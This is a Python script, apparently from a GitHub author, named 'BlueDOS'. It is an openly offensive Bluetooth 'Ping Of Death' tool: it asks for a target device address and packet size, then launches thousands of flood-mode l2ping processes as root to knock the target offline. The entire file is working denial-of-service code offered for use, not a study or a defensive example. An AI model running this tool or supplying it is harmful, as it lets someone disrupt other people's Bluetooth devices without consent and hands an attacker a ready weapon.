#!/usr/bin/env python3

import os
import subprocess
from time import sleep as ts
import logging

R = "\033[91m"
B = "\033[94m"
G = "\033[92m"
W = "\033[0m"
BOLD = "\033[1m"
POD = "\033[4m"

banner = R+BOLD+r"""
██████╗ ██╗     ██╗   ██╗███████╗██████╗  ██████╗ ███████╗
██╔══██╗██║     ██║   ██║██╔════╝██╔══██╗██╔═══██╗██╔════╝
██████╔╝██║     ██║   ██║█████╗  ██║  ██║██║   ██║███████╗
██╔══██╗██║     ██║   ██║██╔══╝  ██║  ██║██║   ██║╚════██║
██████╔╝███████╗╚██████╔╝███████╗██████╔╝╚██████╔╝███████║
╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═════╝  ╚═════╝ ╚══════╝
                                                          
"""+G+BOLD+"""Author"""+W+""": otx2s
"""+G+BOLD+"""Github"""+W+""": https://github.com/otx2s
"""+G+BOLD+"""Version"""+W+""": 1.0
"""+W

logging.basicConfig(filename='bluetooth_attack.log', level=logging.INFO)

if os.geteuid() != 0:
    print(R+BOLD+"[!]"+W+" Please run the BlueDOS as root!")
    logging.error("Please run the BlueDOS as root!")
    exit()

hop = ["hci0", "", "600"]

def main():
    try:
        print(banner)
        logging.info("Bluetooth Ping Of Death Attack Started.")
        hop[0] = input(B+POD+"INTERFACE"+W+" (default: hci0) > ") or "hci0"
        hop[1] = input(B+POD+"TARGET"+W+" > ")
        hop[2] = int(input(B+POD+"SIZE"+W+" (default: 600) > ") or 600)
        print(G+"-"*30+W)
        start = input("Do you want to start: (Y/n) ")
        logging.info(f"Interface: {hop[0]}, Target: {hop[1]}, Size: {hop[2]}")
        if start == 'y' or start == 'Y':
            print(G+"\n[+]"+W+" Bluetooth Ping Of Death Attack Started ...")
            logging.info("Sending packets to the victim. Be patient!")
            ts(1)
            try:
                for i in range(1, 10000):
                    xterm_1 = "l2ping -i %s -s %s -f %s &" % (hop[0], hop[2], hop[1])
                    subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                    ts(2)
            except (KeyboardInterrupt, OSError):
                print(R+"[-]"+W+" Try again!")
                logging.error("Bluetooth Ping Of Death Attack interrupted.")
                ts(2)
                main()
        elif start == 'n' or start == 'N':
            print(B+"\n[*]"+W+" Exiting...")
            logging.info("Bluetooth Ping Of Death Attack terminated.")
            ts(1)
        else:
            print("Check your command!")
            logging.error("Invalid input.")
            main()
    except(KeyboardInterrupt):
        print(B+"\n[*]"+W+" Exiting...")
        logging.info("Bluetooth Ping Of Death Attack interrupted.")

if __name__ == '__main__':
    main()
